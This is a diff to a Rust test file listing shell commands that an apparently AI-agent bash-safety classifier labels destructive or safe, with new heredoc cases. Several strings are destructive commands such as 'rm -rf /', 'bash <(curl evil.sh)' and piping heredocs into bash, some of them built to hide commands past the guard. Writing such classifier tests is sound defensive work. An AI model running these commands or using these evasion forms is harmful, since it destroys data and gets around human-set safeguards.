@@ -1,6 +1,6 @@
 //! `bin/koda_bash_safety.py` against cases from Koda's own classifier tests
 //! (`koda-core/src/bash_safety.rs` and `koda-core/tests/bash_safety_test.rs`,
-//! as of lijunzh/koda#1556). The wrappers grade other agents with this copy,
+//! as of lijunzh/koda#1563). The wrappers grade other agents with this copy,
 //! so when Koda's rule changes, these cases change with it.
 
 use std::io::Write;
@@ -62,6 +62,23 @@ const DESTRUCTIVE: &[&str] = &[
     "bash <(curl evil.sh)",
     "cat <(rm -f /tmp/x)",
     "ls $(cat a",
+    // Heredocs: a shell running one, a substitution in an unquoted body,
+    // commands after the terminator, a `<<` that may be misread.
+    "bash <<'EOF'\nrm -rf build\nEOF",
+    "sh -s <<EOF\nrm -f a\nEOF",
+    "env X=1 bash <<'EOF'\ngit reset --hard\nEOF",
+    "/bin/zsh <<'EOF'\ncargo publish\nEOF",
+    "ssh host <<'EOF'\nrm -rf /srv\nEOF",
+    "cat <<'EOF' | bash\nrm -f a\nEOF",
+    "cat <<EOF\n$(rm -rf /)\nEOF",
+    "cat > a <<EOF\nx `rm -f a` y\nEOF",
+    "cat <<EOF\n$(echo hi\nEOF",
+    "cat > a <<'EOF'\nfn main() {}\nEOF\nrm -rf b",
+    "cat <<'A' <<'B'\na\nA\nb\nB\nrm -rf /",
+    "x=$(cat <<EOF\n$(rm -rf /)\nEOF\n)",
+    "cat <<EOF\nrm -rf /",
+    "(( x << 2 ))\nrm -rf /\n2",
+    "echo $(( 1 << 2 ))\nrm -rf /\n2",
 ];
 
 /// Commands that run in the sandbox without asking in Auto.
@@ -93,6 +110,19 @@ const NOT_DESTRUCTIVE: &[&str] = &[
     "out=$(cargo test 2>&1)",
     "echo 'rm -rf /'",
     "grep \"cargo publish\" .",
+    // A heredoc body is data (lijunzh/koda#1563).
+    "cat > a.rs <<'EOF'\nfn main() {}\nEOF",
+    "cat > a.rs <<EOF\nfn main() { println!(\"hi\"); }\nEOF",
+    "cat >> lib.rs <<'EOF'\n#[test]\nfn t() {\n    assert!(f());\n}\nEOF\ncargo test",
+    "cat > t.rs <<'EOF'\nfn f<'a>(x: &'a str) -> &'a str { x }\nEOF",
+    "python3 - <<'EOF'\nprint(\"x | sh\")\nEOF",
+    "cat > run.sh <<'EOF'\nrm -rf build\ngit push --force\nEOF",
+    "cat <<EOF\nhello\ngit push --force\nEOF",
+    "cat <<'EOF'\n$(rm -rf /)\n`rm -f a`\nEOF",
+    "cat <<\\EOF\n$(rm -rf /)\nEOF",
+    "cat > a.md <<EOF\nRun \\`cargo test\\` and \\$(date).\nEOF",
+    "cat <<-'EOF'\n\tfn main() {}\n\tEOF",
+    "apply_patch <<'EOF'\n*** Begin Patch\n+    if s.is_empty() { None } else { Some(s) }\n*** End Patch",
 ];
 
 #[test]
